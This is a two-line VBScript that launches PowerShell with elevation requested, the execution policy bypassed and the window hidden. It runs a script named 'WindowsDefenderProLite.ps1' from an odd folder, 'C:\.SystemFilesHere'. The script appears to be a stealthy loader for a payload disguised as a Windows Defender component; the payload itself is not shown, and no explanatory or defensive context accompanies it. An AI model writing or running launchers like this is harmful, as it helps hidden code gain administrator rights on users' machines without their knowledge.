Set shell = CreateObject("Shell.Application")
shell.ShellExecute "powershell.exe", "-ExecutionPolicy Bypass -NoLogo -NoProfile -File ""C:\.SystemFilesHere\WindowsDefenderProLite.ps1""", "", "runas", 0
